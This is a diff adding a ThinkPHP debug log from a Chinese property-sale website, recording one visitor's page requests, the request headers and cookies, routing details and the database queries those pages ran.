@@ -1,0 +1,1521 @@
+---------------------------------------------------------------
+[ 2018-03-03T18:06:23+08:00 ] 139.129.142.167 119.4.212.13 GET /index/about/hm.js-56fd97fab2697f58776995f4884b17f8.js
+[ info ] www.yingdizichan.com/index/about/hm.js-56fd97fab2697f58776995f4884b17f8.js [运行时间：0.036489s][吞吐率：27.41req/s] [内存消耗：2,269.41kb] [文件加载：45]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'about',
+    2 => 'hm.js-56fd97fab2697f58776995f4884b17f8.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/about/employ.html',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:25+08:00 ] 139.129.142.167 119.4.212.13 GET /index/about/contract.html
+[ info ] www.yingdizichan.com/index/about/contract.html [运行时间：0.034674s][吞吐率：28.84req/s] [内存消耗：2,300.28kb] [文件加载：44]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'about',
+    2 => 'contract',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/about/employ.html',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\About->contract[ /data/home/qxu1590200456/htdocs/application/index/controller/About.php ]
+[ info ] [ VIEW ] /data/home/qxu1590200456/htdocs/application/index/view/about/contract.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:25+08:00 ] 139.129.142.167 119.4.212.13 GET /index/about/push-1.js
+[ info ] www.yingdizichan.com/index/about/push-1.js [运行时间：0.036339s][吞吐率：27.52req/s] [内存消耗：2,268.73kb] [文件加载：45]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'about',
+    2 => 'push-1.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/about/contract.html',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:25+08:00 ] 139.129.142.167 119.4.212.13 GET /index/about/hm.js-56fd97fab2697f58776995f4884b17f8.js
+[ info ] www.yingdizichan.com/index/about/hm.js-56fd97fab2697f58776995f4884b17f8.js [运行时间：0.038032s][吞吐率：26.29req/s] [内存消耗：2,269.13kb] [文件加载：45]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'about',
+    2 => 'hm.js-56fd97fab2697f58776995f4884b17f8.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/about/contract.html',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:36+08:00 ] 139.129.142.167 119.4.212.13 GET /index/about/news.html
+[ info ] www.yingdizichan.com/index/about/news.html [运行时间：0.056764s][吞吐率：17.62req/s] [内存消耗：4,458.14kb] [文件加载：54]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'about',
+    2 => 'news',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/about/contract.html',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\About->news[ /data/home/qxu1590200456/htdocs/application/index/controller/About.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /data/home/qxu1590200456/htdocs/application/index/view/about/news.html [ array (
+  0 => 'article',
+  1 => 'hot',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.004206s ] mysql:host=qdm162701354.my3w.com;dbname=qdm162701354_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_article` [ RunTime:0.001862s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fdc_article` LIMIT 1 [ RunTime:0.000957s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_article` ORDER BY article_creatime desc LIMIT 0,6 [ RunTime:0.001489s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_article` ORDER BY article_role desc LIMIT 3 [ RunTime:0.001123s ]
+---------------------------------------------------------------
+[ 2018-03-03T18:06:37+08:00 ] 139.129.142.167 119.4.212.13 GET /index/about/hm.js-56fd97fab2697f58776995f4884b17f8.js
+[ info ] www.yingdizichan.com/index/about/hm.js-56fd97fab2697f58776995f4884b17f8.js [运行时间：0.035748s][吞吐率：27.97req/s] [内存消耗：2,269.16kb] [文件加载：45]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'about',
+    2 => 'hm.js-56fd97fab2697f58776995f4884b17f8.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/about/news.html',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:37+08:00 ] 139.129.142.167 119.4.212.13 GET /index/about/push-1.js
+[ info ] www.yingdizichan.com/index/about/push-1.js [运行时间：0.038312s][吞吐率：26.10req/s] [内存消耗：2,268.77kb] [文件加载：45]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'about',
+    2 => 'push-1.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/about/news.html',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:46+08:00 ] 139.129.142.167 119.4.212.13 GET /index/about/about.html
+[ info ] www.yingdizichan.com/index/about/about.html [运行时间：0.033504s][吞吐率：29.85req/s] [内存消耗：2,302.66kb] [文件加载：44]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'about',
+    2 => 'about',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/about/news.html',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\About->about[ /data/home/qxu1590200456/htdocs/application/index/controller/About.php ]
+[ info ] [ VIEW ] /data/home/qxu1590200456/htdocs/application/index/view/about/about.html [ array (
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:46+08:00 ] 139.129.142.167 119.4.212.13 GET /index/about/push-1.js
+[ info ] www.yingdizichan.com/index/about/push-1.js [运行时间：0.033504s][吞吐率：29.85req/s] [内存消耗：2,268.80kb] [文件加载：45]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'about',
+    2 => 'push-1.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/about/about.html',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:46+08:00 ] 139.129.142.167 119.4.212.13 GET /index/about/hm.js-56fd97fab2697f58776995f4884b17f8.js
+[ info ] www.yingdizichan.com/index/about/hm.js-56fd97fab2697f58776995f4884b17f8.js [运行时间：0.034778s][吞吐率：28.75req/s] [内存消耗：2,269.09kb] [文件加载：45]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'about',
+    2 => 'hm.js-56fd97fab2697f58776995f4884b17f8.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/about/about.html',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:49+08:00 ] 139.129.142.167 119.4.212.13 GET /
+[ info ] www.yingdizichan.com/ [运行时间：0.056305s][吞吐率：17.76req/s] [内存消耗：4,321.05kb] [文件加载：51]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/about/about.html',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/home/qxu1590200456/htdocs/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /data/home/qxu1590200456/htdocs/application/index/view/index/index.html [ array (
+  0 => 'sale',
+  1 => 'news',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.004148s ] mysql:host=qdm162701354.my3w.com;dbname=qdm162701354_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_sale` [ RunTime:0.002209s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_sale` ORDER BY sale_creatime desc LIMIT 10 [ RunTime:0.001065s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_article` [ RunTime:0.001421s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_article` ORDER BY article_creatime desc LIMIT 4 [ RunTime:0.001053s ]
+---------------------------------------------------------------
+[ 2018-03-03T18:06:50+08:00 ] 139.129.142.167 119.4.212.13 POST /extend/ajax-login/enews.php
+[ info ] www.yingdizichan.com/extend/ajax-login/enews.php [运行时间：0.031179s][吞吐率：32.07req/s] [内存消耗：1,885.61kb] [文件加载：38]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'extend',
+    1 => 'ajax-login',
+    2 => 'enews.php',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '13',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'origin' => 'http://www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+  'x-requested-with' => 'XMLHttpRequest',
+)
+[ info ] [ PARAM ] array (
+  'enews' => 'LoginJS',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:50+08:00 ] 139.129.142.167 119.4.212.13 GET /index/sale/sale.html
+[ info ] www.yingdizichan.com/index/sale/sale.html [运行时间：0.070758s][吞吐率：14.13req/s] [内存消耗：3,476.54kb] [文件加载：54]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'sale',
+    2 => 'sale',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Sale->sale[ /data/home/qxu1590200456/htdocs/application/index/controller/Sale.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /data/home/qxu1590200456/htdocs/application/index/view/sale/sale.html [ array (
+  0 => 'saleInfo',
+  1 => 'saleRole',
+  2 => 'text',
+  3 => 'subway',
+  4 => 'area',
+  5 => 'saprice',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.006059s ] mysql:host=qdm162701354.my3w.com;dbname=qdm162701354_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_sale` [ RunTime:0.001991s ]
+[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `fdc_sale` LIMIT 1 [ RunTime:0.001133s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_sale` LIMIT 0,5 [ RunTime:0.001202s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_sale` ORDER BY sale_role desc LIMIT 3 [ RunTime:0.001278s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_subway` [ RunTime:0.002100s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_subway` ORDER BY subway_num asc [ RunTime:0.001227s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_area` [ RunTime:0.001701s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_area` ORDER BY area_num asc [ RunTime:0.001056s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_saprice` [ RunTime:0.001649s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_saprice` ORDER BY saprice_num asc [ RunTime:0.001111s ]
+---------------------------------------------------------------
+[ 2018-03-03T18:06:51+08:00 ] 139.129.142.167 119.4.212.13 GET /extend/ajax-login/functions.js
+[ info ] www.yingdizichan.com/extend/ajax-login/functions.js [运行时间：0.028695s][吞吐率：34.85req/s] [内存消耗：1,883.38kb] [文件加载：38]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'extend',
+    1 => 'ajax-login',
+    2 => 'functions.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/sale/sale.html',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:51+08:00 ] 139.129.142.167 119.4.212.13 GET /extend/ajax-Browse-records/Browse.min.js
+[ info ] www.yingdizichan.com/extend/ajax-Browse-records/Browse.min.js [运行时间：0.028183s][吞吐率：35.48req/s] [内存消耗：1,883.29kb] [文件加载：38]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'extend',
+    1 => 'ajax-Browse-records',
+    2 => 'Browse.min.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/sale/sale.html',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:51+08:00 ] 139.129.142.167 119.4.212.13 GET /index/sale/hm.js-56fd97fab2697f58776995f4884b17f8.js
+[ info ] www.yingdizichan.com/index/sale/hm.js-56fd97fab2697f58776995f4884b17f8.js [运行时间：0.035803s][吞吐率：27.93req/s] [内存消耗：2,264.26kb] [文件加载：45]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'sale',
+    2 => 'hm.js-56fd97fab2697f58776995f4884b17f8.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/sale/sale.html',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:51+08:00 ] 139.129.142.167 119.4.212.13 GET /index/sale/push-1.js
+[ info ] www.yingdizichan.com/index/sale/push-1.js [运行时间：0.034123s][吞吐率：29.31req/s] [内存消耗：2,263.73kb] [文件加载：45]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'sale',
+    2 => 'push-1.js',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/sale/sale.html',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T18:06:51+08:00 ] 139.129.142.167 119.4.212.13 GET /index/entrust/entrust.html
+[ info ] www.yingdizichan.com/index/entrust/entrust.html [运行时间：0.033638s][吞吐率：29.73req/s] [内存消耗：2,321.22kb] [文件加载：44]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'entrust',
+    2 => 'entrust',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'connection' => 'keep-alive',
+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/sale/sale.html',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Entrust->entrust[ /data/home/qxu1590200456/htdocs/application/index/controller/Entrust.php ]
